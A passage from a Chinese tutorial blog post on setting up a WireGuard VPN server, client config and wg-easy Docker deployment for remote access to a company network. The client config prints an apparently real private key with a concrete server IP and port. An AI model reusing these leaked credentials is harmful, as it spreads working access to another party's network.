class="hljs-number">10.0</span>.<span class="hljs-number">8.1</span> <span class="hljs-meta">#本机虚拟局域网IP</span><br><br>PostUp   <span class="hljs-punctuation">=</span> iptables <span class="hljs-punctuation">-</span>A FORWARD <span class="hljs-punctuation">-</span>i wg0 <span class="hljs-punctuation">-</span>j ACCEPT<span class="hljs-punctuation">;</span> iptables <span class="hljs-punctuation">-</span>A FORWARD <span class="hljs-punctuation">-</span>o wg0 <span class="hljs-punctuation">-</span>j ACCEPT<span class="hljs-punctuation">;</span> iptables <span class="hljs-punctuation">-</span>t nat <span class="hljs-punctuation">-</span>A POSTROUTING <span class="hljs-punctuation">-</span>o eth0 <span class="hljs-punctuation">-</span>j MASQUERADE<br>PostDown <span class="hljs-punctuation">=</span> iptables <span class="hljs-punctuation">-</span>D FORWARD <span class="hljs-punctuation">-</span>i wg0 <span class="hljs-punctuation">-</span>j ACCEPT<span class="hljs-punctuation">;</span> iptables <span class="hljs-punctuation">-</span>D FORWARD <span class="hljs-punctuation">-</span>o wg0 <span class="hljs-punctuation">-</span>j ACCEPT<span class="hljs-punctuation">;</span> iptables <span class="hljs-punctuation">-</span>t nat <span class="hljs-punctuation">-</span>D POSTROUTING <span class="hljs-punctuation">-</span>o eth0 <span class="hljs-punctuation">-</span>j MASQUERADE<br><span class="hljs-meta">#注意eth0需要为本机网卡名称</span><br><br>ListenPort <span class="hljs-punctuation">=</span> <span class="hljs-number">50814</span> <span class="hljs-meta"># 监听端口</span><br>DNS <span class="hljs-punctuation">=</span> <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span><br>MTU <span class="hljs-punctuation">=</span> <span class="hljs-number">1420</span><br>[Peer]<br>PublicKey <span class="hljs-punctuation">=</span>  $<span class="hljs-punctuation">(</span>cat client1.key.pub<span class="hljs-punctuation">)</span>  <span class="hljs-meta">#自动client1的公钥</span><br>AllowedIPs <span class="hljs-punctuation">=</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">8.10</span>/<span class="hljs-number">32</span> <span class="hljs-meta">#客户端所使用的IP&quot; &gt; wg0.conf</span><br></code></pre></td></tr></table></figure><p>7.启动服务</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#设置开机自启动</span><br>systemctl enable wg-quick<span class="hljs-variable">@wg0</span><br><br><span class="hljs-comment">#启动wg0</span><br>wg-quick up wg0<br><br><span class="hljs-comment">#关闭wg0</span><br>wg-quick down wg0<br><br><span class="hljs-comment">#如果启动失败只有有wg0网卡，需删除再次启动</span><br>ip <span class="hljs-keyword">link</span> <span class="hljs-keyword">delete</span> wg0<br></code></pre></td></tr></table></figure><p>8.配置客户端</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Windows下载地址：https://www.wireguard.com/install/</span><br><br><span class="hljs-comment">#客户端配置</span><br>[Interface]<br>PrivateKey = 6M8HEZioew+vR3i53sPc64Vg40YsuMzh4vI1Lkc88Xo= <span class="hljs-comment">#此处为client1的私钥</span><br>Address = 10.0.8.10 <span class="hljs-comment">#此处为peer规定的客户端IP</span><br>MTU = 1500<br><br>[Peer]<br>PublicKey = Tt5WEa0Vycf4F+TTjR2TAHDfa2onhh+tY8YOIT3cKjI= <span class="hljs-comment">#此处为server的公钥</span><br>AllowedIPs = 10.0.8.0/24 <span class="hljs-comment">#此处为允许的服务器IP</span><br>Endpoint = 114.132.56.178:50814 <span class="hljs-comment">#服务器对端IP+端口</span><br></code></pre></td></tr></table></figure><p>9.连接</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/4658e56cf5dc493194931b981480e24a.png" alt="4658e56cf5dc493194931b981480e24a.png">编辑这时候很明显我电脑和服务器地址不在一个网段，但是我也可以成功访问公司网络咯~</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/09870e03be6c457aaca5f71da26dc80c.png" alt="09870e03be6c457aaca5f71da26dc80c.png"></p><h2 id="三、docker部署"><a href="#三、docker部署" class="headerlink" title="三、docker部署"></a>三、docker部署</h2><p>这种方式简单，前提是需要安装docker。关于docker部署，cicd专栏-kubeadm部署k8s一篇博文中有写到。感兴趣小伙伴可以参考</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --name=wg-easy <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e WG_HOST=<span class="hljs-number">123.123.123.123</span> (🚨这里输入服务器的公网IP) <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e PASSWORD=passwd123 (🚨这里输入你的密码) <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e WG_DEFAULT_ADDRESS=<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>.x （🚨默认IP地址）<span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e WG_DEFAULT_DNS=<span class="hljs-number">114.114.114.114</span> （🚨默认DNS）<span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e WG_ALLOWED_IPS=<span class="hljs-number">10.0.8.0</span>/<span class="hljs-number">24</span> （🚨允许连接的IP段）<span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e WG_PERSISTENT_KEEPALIVE=<span class="hljs-number">25</span> （🚨重连间隔）<span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -v ~/.wg-easy:/etc/wireguard <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -p <span class="hljs-number">51820</span>:<span class="hljs-number">51820</span>/udp <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -p <span class="hljs-number">51821</span>:<span class="hljs-number">51821</span>/tcp <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --cap-add=NET_ADMIN <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --cap-add=SYS_MODULE <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --sysctl=<span class="hljs-string">&quot;net.ipv4.conf.all.src_valid_mark=1&quot;</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --sysctl=<span class="hljs-string">&quot;net.ipv4.ip_forward=1&quot;</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --restart unless-stopped <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  weejewel/wg-easy<br></code></pre></td></tr></table></figure><p>容器更新命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker stop wg-easy<br>docker <span class="hljs-built_in">rm</span> wg-easy<br>docker pull weejewel/wg-easy<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络篇</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
